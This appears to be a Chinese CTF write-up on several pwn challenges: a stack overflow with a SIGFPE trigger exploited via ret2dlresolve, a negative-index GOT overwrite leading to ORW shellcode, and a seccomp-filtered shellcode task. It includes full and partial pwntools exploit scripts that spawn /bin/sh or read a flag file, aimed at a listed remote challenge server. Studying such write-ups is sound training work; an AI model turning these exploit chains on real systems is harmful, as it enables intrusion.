<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">read_s</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">68</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);                  <span class="comment">// 栈溢出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>strcpy 会将字符串末尾置空，导致 fdg 被设置为“0”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>(nameg, name);</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>利用 strcpy 的溢出覆盖 fdg 为“0”，通过第二次输入绕过程序的字符串匹配检查</p>
<p>接着就要考虑如何触发浮点异常信号 SIGFPE：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">v2 = <span class="string">&quot;give me the soul:&quot;</span>;</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, soul);</span><br><span class="line">v2 = <span class="string">&quot;give me the egg:&quot;</span>;</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;egg);</span><br><span class="line"><span class="keyword">if</span> ( egg )</span><br><span class="line">&#123;</span><br><span class="line">  signal(<span class="number">8</span>, (<span class="keyword">__sighandler_t</span>)read_s);</span><br><span class="line">  soul[<span class="number">1</span>] = soul[<span class="number">0</span>] / egg;</span><br><span class="line">  signal(<span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于除号两边都是 int 类型，因此 <code>-0x80000000/-1</code> 就会触发漏洞（<code>-0x80000000/-1</code> 的计算结果为 <code>0x80000000</code>，其值为负数，导致符号位溢出）</p>
<p>由于没法泄露，因此只能打 ret2dlresolve</p>
<p>对于32位无 PIE 保护的程序，在 pwntools 中有比较成熟的 ret2dlresolve 工具，直接拿来用就好了</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> signal <span class="keyword">import</span> pause</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">32</span></span><br><span class="line">challenge = <span class="string">&#x27;./test&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line">context.binary = elf</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b* 0x8049268&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sl(<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">p.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sl(<span class="string">&quot;hello_boy&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sl(<span class="string">&quot;-2147483648&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sl(<span class="string">&quot;-1&quot;</span>)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x804C080</span>+<span class="number">0x200</span></span><br><span class="line">rop = ROP(context.binary)</span><br><span class="line">dlresolve = Ret2dlresolvePayload(elf,symbol=<span class="string">&quot;system&quot;</span>,args=[<span class="string">&quot;/bin/sh&quot;</span>])</span><br><span class="line"></span><br><span class="line">rop.read(<span class="number">0</span>,dlresolve.data_addr)</span><br><span class="line">rop.ret2dlresolve(dlresolve)</span><br><span class="line"><span class="built_in">print</span>(rop.dump())</span><br><span class="line"></span><br><span class="line">raw_rop = rop.chain()</span><br><span class="line">sl(flat([&#123;<span class="number">76</span>:raw_rop&#125;]))</span><br><span class="line">sl(dlresolve.payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.23</span><span class="number">-0u</span>buntu11<span class="number">.3</span>)</span> stable release version 2.23, by Roland McGrath et al.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwn: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=<span class="number">02</span>a3c09af5900983d07486d2b3310dffcebfde86, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Partial RELRO，Canary，PIE</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x08</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x05</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x0000003c</span>  <span class="keyword">if</span> (A != <span class="built_in">exit</span>) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<ul>
<li>白名单，只能打 ORW</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>index 缺乏检查，导致 chunk_list 可以向上溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">chunk_list[index] = <span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="keyword">if</span> ( !chunk_list[index] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>程序的限制比较多：</p>
<ul>
<li>add 可以执行2次，dele 可以执行1次</li>
<li>每次输入的 size 大小不超过8字节，index 大小不超过1（可以为负数）</li>
</ul>
<p>由于 index 可以为负数，可以尝试向上溢出，能够劫持的地方只有两处：GOT，IO_FILE</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">98</span>:<span class="number">04</span>c0│  <span class="number">0x564531002060</span> (<span class="built_in">malloc</span>@got.plt) —▸ <span class="number">0x7fa488599180</span> (<span class="built_in">malloc</span>) ◂— push   rbp</span><br><span class="line"><span class="number">99</span>:<span class="number">04</span>c8│  <span class="number">0x564531002068</span> (setvbuf@got.plt) —▸ <span class="number">0x7fa488584e80</span> (setvbuf) ◂— push   rbp</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a2:<span class="number">0510</span>│  <span class="number">0x5645310020b0</span> —▸ <span class="number">0x7fa4888d98e0</span> (_IO_2_1_stdin_) ◂— <span class="number">0xfbad208b</span></span><br><span class="line">a3:<span class="number">0518</span>│  <span class="number">0x5645310020b8</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<p>往 GOT 写入堆地址似乎没有什么用，劫持 IO_FILE 的话输入的字节数又太少</p>
<p>后来突然意识到一点：写入 GOT 的堆中数据可能会被执行（没有 NX），有些 wp 上也是利用这一点进行入侵</p>
<p>但经测试发现这些数据没有执行权限，vmmap 打印的 heap 段也没有显示x权限</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap <span class="number">0x555555605160</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x555555605000</span>     <span class="number">0x555555626000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [heap] +<span class="number">0x160</span></span><br></pre></td></tr></table></figure>
<p>一番查找后得知：某些旧版本的操作系统可能不支持或不启用NX位，在这种情况下，即使关闭了NX位，堆仍然不会具有执行权限</p>
<p>接下来的思路就简单了，往 GOT 写入并执行8字节的指令，共有2次机会</p>
<p>其中最适合写指令的 GOT 表条目就是 <code>atoi got</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">readn(nptr, <span class="number">16LL</span>);</span><br><span class="line"><span class="keyword">return</span> atoi(nptr);</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x555555400e29</span>    call   atoi@plt                &lt;atoi@plt&gt;</span><br><span class="line">       nptr: <span class="number">0x7fffffffdc20</span> ◂— <span class="number">0x31</span> <span class="comment">/* &#x27;1&#x27; */</span></span><br></pre></td></tr></table></figure>
<p>因为栈也是有执行权限的，如果在 <code>atoi got</code> 中写入 <code>jmp rdi</code> 就可以劫持控制流到栈上，然后执行一个 sys_read 就可以写入 ORW 的 shellcode</p>
<p>由于 heap 权限的问题没有解决，我这里只能参考网上的 exp 大概写一下</p>
<p>非完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pwn1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">c = <span class="string">&quot;set exec-wrapper env &#x27;LD_PRELOAD=./libc-2.23.so&#x27;\nrun\nb *$rebase(0xE29)\n&quot;</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="comment">#p = process(challenge)</span></span><br><span class="line">    p = gdb.debug(challenge,c)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,c)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size,data</span>):</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">type</span>(index) == <span class="built_in">int</span>):</span><br><span class="line">        sla(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">&quot;index:&quot;</span>,index)</span><br><span class="line">    sla(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;content:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">index</span>):</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">type</span>(index) == <span class="built_in">int</span>):</span><br><span class="line">        sla(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">&quot;index:&quot;</span>,index)</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;-14&quot;</span>,<span class="number">0x8</span>,asm(<span class="string">&quot;jmp rdi&quot;</span>))</span><br><span class="line"></span><br><span class="line">shellcode_open = shellcraft.pushstr(<span class="string">&quot;flag&quot;</span>) + shellcraft.<span class="built_in">open</span>(<span class="string">&quot;rsp&quot;</span>)</span><br><span class="line">shellcode_read = shellcraft.read(<span class="string">&quot;rax&quot;</span>,<span class="string">&quot;rsp&quot;</span>,<span class="number">60</span>)</span><br><span class="line">shellcode_write = shellcraft.write(<span class="number">1</span>,<span class="string">&quot;rsp&quot;</span>,<span class="number">60</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode_open))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode_read))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode_write))</span><br><span class="line"></span><br><span class="line">shellcode_magic = asm(<span class="string">&quot;xor rax,rax;mov dl,0x80;mov rsi,rbp;push rax;pop rdi;syscall;jmp rbp&quot;</span>)</span><br><span class="line">cmd(shellcode_magic)</span><br><span class="line"></span><br><span class="line">p.send(asm(shellcode_open+shellcode_read+shellcode_write))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">shellcode: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), statically linked, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，NX</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00000005</span>  <span class="keyword">if</span> (A == fstat) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000025</span>  <span class="keyword">if</span> (A == alarm) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0003</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  <span class="keyword">if</span> (A == stat) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x000000e7</span>  <span class="keyword">if</span> (A == exit_group) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br><span class="line"><span class="number">0008</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br></pre></td></tr></table></figure>
<ul>
<li>白名单，要考虑 retfq 切换32位架构绕过 seccomp</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>直接执行 shellcode：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">size = sys_read(<span class="number">0</span>, shellcode, <span class="number">0x1000</span>uLL);</span><br><span class="line">size2 = size;</span><br><span class="line"><span class="keyword">if</span> ( shellcode[(<span class="keyword">int</span>)size - <span class="number">1</span>] == <span class="number">0xA</span> )</span><br><span class="line">&#123;</span><br><span class="line">  shellcode[(<span class="keyword">int</span>)size - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  size2 = size - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; size2; ++i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( shellcode[i] &lt;= <span class="number">0x1F</span> || shellcode[i] == <span class="number">0x7F</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">&#125;</span><br><span class="line">((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))shellcode)();</span><br></pre></td></tr></table></figure>
<ul>
<li>现在 shellcode 的范围为 <code>(0x1f,0x7f)</code></li>
</ul>
